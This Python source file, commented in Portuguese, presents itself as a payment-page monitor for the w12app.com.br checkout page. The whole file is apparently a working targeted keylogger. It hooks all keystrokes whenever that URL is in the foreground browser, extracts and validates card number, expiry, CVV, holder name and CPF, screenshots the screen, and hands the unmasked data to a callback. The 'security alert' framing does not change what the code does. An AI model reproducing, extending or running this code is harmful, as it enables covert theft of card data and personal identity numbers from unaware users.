"""
Monitor de página de pagamento e dados de cartão
Monitora: Número, Validade, CVV, Nome e CPF
"""

import re
import time
import threading
from dataclasses import dataclass
from datetime import datetime
from typing import Callable, Optional
from PIL import ImageGrab, Image, ImageDraw, ImageFont

from pynput import keyboard

try:
    import win32gui
    import win32process
    import psutil
    import uiautomation as auto
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False


@dataclass
class CardData:
    """Dados completos do cartão detectados"""
    card_number: Optional[str] = None
    expiry_date: Optional[str] = None
    cvv: Optional[str] = None
    holder_name: Optional[str] = None
    cpf: Optional[str] = None
    
    @property
    def is_complete(self) -> bool:
        """Verifica se TODOS os 5 campos estão preenchidos"""
        return all([
            self.card_number,
            self.expiry_date,
            self.cvv,
            self.holder_name,
            self.cpf
        ])
    
    @property
    def filled_count(self) -> int:
        """Quantidade de campos preenchidos"""
        fields = [self.card_number, self.expiry_date, self.cvv, self.holder_name, self.cpf]
        return sum(1 for f in fields if f)
    
    def get_masked(self) -> dict:
        """Retorna dados mascarados para exibição"""
        card = "N/A"
        if self.card_number:
            clean = re.sub(r'\D', '', self.card_number)
            if len(clean) >= 12:
                card = f"{clean[:4]} •••• •••• {clean[-4:]}"
        
        cpf = "N/A"
        if self.cpf:
            clean = re.sub(r'\D', '', self.cpf)
            if len(clean) == 11:
                cpf = f"•••.{clean[3:6]}.•••-••"
        
        return {
            'card': card,
            'expiry': self.expiry_date or "N/A",
            'cvv': '•••' if self.cvv else "N/A",
            'name': self.holder_name or "N/A",
            'cpf': cpf
        }
    
    def get_status(self) -> dict:
        """Retorna status de cada campo"""
        return {
            'card_number': self.card_number is not None,
            'expiry_date': self.expiry_date is not None,
            'cvv': self.cvv is not None,
            'holder_name': self.holder_name is not None,
            'cpf': self.cpf is not None
        }
    
    def reset(self):
        """Limpa todos os dados"""
        self.card_number = None
        self.expiry_date = None
        self.cvv = None
        self.holder_name = None
        self.cpf = None


class PaymentPageMonitor:
    """
    Monitor para página de pagamento do W12 App
    Detecta: Número do cartão, Validade, CVV, Nome e CPF
    """
    
    TARGET_URL = "w12app.com.br"
    TARGET_PATH = "formas-pagamento"
    
    BROWSERS = ['chrome', 'firefox', 'edge', 'msedge', 'opera', 'brave']
    
    def __init__(self, on_alert: Callable[[CardData, Image.Image, str], None]):
        """
        Args:
            on_alert: Callback quando TODOS os dados são detectados
                      Recebe (CardData, screenshot, url)
        """
        self.on_alert = on_alert
        
        self.running = False
        self.is_on_target_page = False
        self.current_url = ""
        self.card_data = CardData()
        self.buffer = ""
        
        self._detected_values = set()
        
        self._url_thread: Optional[threading.Thread] = None
        self._keyboard_listener = None
        
        self._last_alert_time: Optional[datetime] = None
        self._alert_cooldown = 60
        
        self.on_page_status_change: Optional[Callable[[bool, str], None]] = None
        self.on_field_change: Optional[Callable[[dict], None]] = None
    
    def _get_browser_url(self) -> Optional[str]:
        """Obtém URL do navegador ativo"""
        if not HAS_WIN32:
            return None
        
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            process_name = process.name().lower()
            
            if not any(b in process_name for b in self.BROWSERS):
                return None
            
            window = auto.ControlFromHandle(hwnd)
            if not window:
                return None
            
            edit = window.EditControl(searchDepth=10)
            if edit.Exists(0.1):
                url = edit.GetValuePattern().Value
                if url:
                    return url
                    
        except Exception:
            pass
        
        return None
    
    def _is_target_page(self, url: str) -> bool:
        """Verifica se é a página alvo"""
        if not url:
            return False
        
        url_lower = url.lower()
        return self.TARGET_URL in url_lower and self.TARGET_PATH in url_lower
    
    def _url_monitor_loop(self):
        """Loop de monitoramento de URL"""
        while self.running:
            try:
                url = self._get_browser_url()
                
                if url:
                    is_target = self._is_target_page(url)
                    
                    if is_target != self.is_on_target_page:
                        self.is_on_target_page = is_target
                        self.current_url = url if is_target else ""
                        
                        if is_target:
                            print(f"\n{'='*50}")
                            print(f"✅ PÁGINA DE PAGAMENTO DETECTADA!")
                            print(f"   URL: {url[:50]}...")
                            print(f"{'='*50}")
                            self.card_data.reset()
                            self.buffer = ""
                            self._detected_values.clear()
                        else:
                            print("\n📤 Saiu da página de pagamento")
                            self.card_data.reset()
                            self.buffer = ""
                            self._detected_values.clear()
                        
                        if self.on_page_status_change:
                            self.on_page_status_change(is_target, url if is_target else "")
                
            except Exception:
                pass
            
            time.sleep(0.5)
    
    @staticmethod
    def _luhn_check(number: str) -> bool:
        """Valida número de cartão com algoritmo de Luhn"""
        try:
            digits = [int(d) for d in re.sub(r'\D', '', number)]
            if len(digits) < 13 or len(digits) > 19:
                return False
            
            checksum = 0
            for i, d in enumerate(reversed(digits)):
                if i % 2 == 1:
                    d *= 2
                    if d > 9:
                        d -= 9
                checksum += d
            
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def _validate_cpf(cpf: str) -> bool:
        """Valida CPF brasileiro"""
        cpf = re.sub(r'\D', '', cpf)
        
        if len(cpf) != 11:
            return False
        
        if cpf == cpf[0] * 11:
            return False
        
        soma = sum(int(cpf[i]) * (10 - i) for i in range(9))
        d1 = (soma * 10 % 11) % 10
        
        soma = sum(int(cpf[i]) * (11 - i) for i in range(10))
        d2 = (soma * 10 % 11) % 10
        
        return cpf[-2:] == f"{d1}{d2}"
    
    def _detect_card_number(self, text: str) -> Optional[str]:
        """Detecta número de cartão (16 dígitos)"""
        patterns = [
            r'[0-9]{4}[\s\-\.]*[0-9]{4}[\s\-\.]*[0-9]{4}[\s\-\.]*[0-9]{4}',
            r'[0-9]{16}'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                clean = re.sub(r'\D', '', match)
                if clean not in self._detected_values and self._luhn_check(match):
                    self._detected_values.add(clean)
                    return match
        
        return None
    
    def _detect_expiry_date(self, text: str) -> Optional[str]:
        """Detecta data de validade (MM/AA ou MM/AAAA)"""
        patterns = [
            r'(?:0[1-9]|1[0-2])[\s]*[/\-][\s]*(?:2[4-9]|[3-9][0-9])',
            r'(?:0[1-9]|1[0-2])[\s]*[/\-][\s]*20[2-9][0-9]'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                value = match.group()
                if value not in self._detected_values:
                    self._detected_values.add(value)
                    return value
        
        return None
    
    def _detect_cvv(self, text: str) -> Optional[str]:
        """Detecta CVV (3 ou 4 dígitos isolados)"""
        clean_text = text
        
        if self.card_data.card_number:
            clean_text = clean_text.replace(self.card_data.card_number, ' ')
            clean_num = re.sub(r'\D', '', self.card_data.card_number)
            clean_text = clean_text.replace(clean_num, ' ')
        
        if self.card_data.expiry_date:
            clean_text = clean_text.replace(self.card_data.expiry_date, ' ')
        
        if self.card_data.cpf:
            clean_text = clean_text.replace(self.card_data.cpf, ' ')
            clean_cpf = re.sub(r'\D', '', self.card_data.cpf)
            clean_text = clean_text.replace(clean_cpf, ' ')
        
        match = re.search(r'(?<![0-9])[0-9]{3,4}(?![0-9])', clean_text)
        if match:
            value = match.group()
            if value not in self._detected_values:
                self._detected_values.add(value)
                return value
        
        return None
    
    def _detect_holder_name(self, text: str) -> Optional[str]:
        """Detecta nome do titular (letras maiúsculas, mínimo 2 palavras)"""
        pattern = r'[A-Z][A-Z]+(?:\s+[A-Z][A-Z]+)+'
        matches = re.findall(pattern, text.upper())
        
        for match in matches:
            words = match.strip().split()
            if len(words) >= 2 and all(len(w) >= 2 for w in words):
                name = ' '.join(words)
                if name not in self._detected_values and len(name) >= 5:
                    self._detected_values.add(name)
                    return name
        
        return None
    
    def _detect_cpf(self, text: str) -> Optional[str]:
        """Detecta CPF (11 dígitos)"""
        patterns = [
            r'[0-9]{3}[\.\s]?[0-9]{3}[\.\s]?[0-9]{3}[\-\s]?[0-9]{2}',
            r'(?<![0-9])[0-9]{11}(?![0-9])'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                clean = re.sub(r'\D', '', match)
                if clean not in self._detected_values and self._validate_cpf(match):
                    self._detected_values.add(clean)
                    return match
        
        return None
    
    def _detect_patterns(self):
        """Detecta todos os padrões no buffer"""
        text = self.buffer
        changed = False
        
        if not self.card_data.card_number:
            card = self._detect_card_number(text)
            if card:
                self.card_data.card_number = card
                changed = True
                masked = self.card_data.get_masked()['card']
                print(f"   💳 Cartão detectado: {masked}")
        
        if not self.card_data.expiry_date:
            expiry = self._detect_expiry_date(text)
            if expiry:
                self.card_data.expiry_date = expiry
                changed = True
                print(f"   📅 Validade detectada: {expiry}")
        
        if self.card_data.card_number and not self.card_data.cvv:
            cvv = self._detect_cvv(text)
            if cvv:
                self.card_data.cvv = cvv
                changed = True
                print(f"   🔐 CVV detectado: •••")
        
        if not self.card_data.holder_name:
            name = self._detect_holder_name(text)
            if name:
                self.card_data.holder_name = name
                changed = True
                print(f"   👤 Nome detectado: {name}")
        
        if not self.card_data.cpf:
            cpf = self._detect_cpf(text)
            if cpf:
                self.card_data.cpf = cpf
                changed = True
                masked = self.card_data.get_masked()['cpf']
                print(f"   📄 CPF detectado: {masked}")
        
        if changed and self.on_field_change:
            self.on_field_change(self.card_data.get_status())
        
        if self.card_data.is_complete:
            self._trigger_alert()
    
    def _trigger_alert(self):
        """Dispara o alerta quando TODOS os dados estão completos"""
        if self._last_alert_time:
            elapsed = (datetime.now() - self._last_alert_time).seconds
            if elapsed < self._alert_cooldown:
                return
        
        self._last_alert_time = datetime.now()
        
        print(f"\n{'='*50}")
        print("🚨 ALERTA: TODOS os dados do cartão detectados!")
        print(f"   💳 Cartão: {self.card_data.get_masked()['card']}")
        print(f"   📅 Validade: {self.card_data.expiry_date}")
        print(f"   🔐 CVV: •••")
        print(f"   👤 Nome: {self.card_data.holder_name}")
        print(f"   📄 CPF: {self.card_data.get_masked()['cpf']}")
        print(f"{'='*50}\n")
        
        screenshot = self._capture_screenshot()
        
        if self.on_alert:
            self.on_alert(self.card_data, screenshot, self.current_url)
        
        self.card_data.reset()
        self.buffer = ""
        self._detected_values.clear()
    
    def _capture_screenshot(self) -> Image.Image:
        """Captura screenshot da tela com marcações"""
        try:
            screenshot = ImageGrab.grab()
            
            border = 5
            new_img = Image.new(
                'RGB',
                (screenshot.width + border*2, screenshot.height + border*2),
                '#dc3545'
            )
            new_img.paste(screenshot, (border, border))
            
            draw = ImageDraw.Draw(new_img)
            timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            text = f"⚠️ ALERTA DE SEGURANÇA - {timestamp}"
            
            try:
                font = ImageFont.truetype("arial.ttf", 16)
            except:
                font = ImageFont.load_default()
            
            draw.rectangle([5, 5, 420, 30], fill='#1a1a1a')
            draw.text((10, 8), text, fill='#ff6b6b', font=font)
            
            return new_img
            
        except Exception as e:
            print(f"Erro ao capturar screenshot: {e}")
            return Image.new('RGB', (800, 600), '#333333')
    
    def _on_key_press(self, key):
        """Callback do teclado"""
        if not self.is_on_target_page:
            return
        
        try:
            if hasattr(key, 'char') and key.char:
                char = key.char
            elif key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.backspace:
                self.buffer = self.buffer[:-1]
                return
            elif key == keyboard.Key.tab or key == keyboard.Key.enter:
                char = ' '
            else:
                return
            
            self.buffer += char
            
            if len(self.buffer) > 800:
                self.buffer = self.buffer[-600:]
            
            if len(self.buffer) % 2 == 0:
                self._detect_patterns()
            
        except Exception:
            pass
    
    def start(self):
        """Inicia o monitoramento"""
        if self.running:
            return
        
        self.running = True
        
        self._url_thread = threading.Thread(target=self._url_monitor_loop, daemon=True)
        self._url_thread.start()
        
        self._keyboard_listener = keyboard.Listener(on_press=self._on_key_press)
        self._keyboard_listener.start()
        
        print("\n" + "="*50)
        print("✅ MONITOR INICIADO")
        print(f"   Monitorando: {self.TARGET_URL}/.../{self.TARGET_PATH}")
        print("   Aguardando você acessar a página...")
        print("="*50 + "\n")
    
    def stop(self):
        """Para o monitoramento"""
        self.running = False
        
        if self._keyboard_listener:
            self._keyboard_listener.stop()
        
        print("🛑 Monitor parado")
    
    def get_status(self) -> dict:
        """Retorna status atual"""
        return {
            'running': self.running,
            'on_payment_page': self.is_on_target_page,
            'current_url': self.current_url,
            'fields': self.card_data.get_status(),
            'filled_count': self.card_data.filled_count,
            'is_complete': self.card_data.is_complete
        }
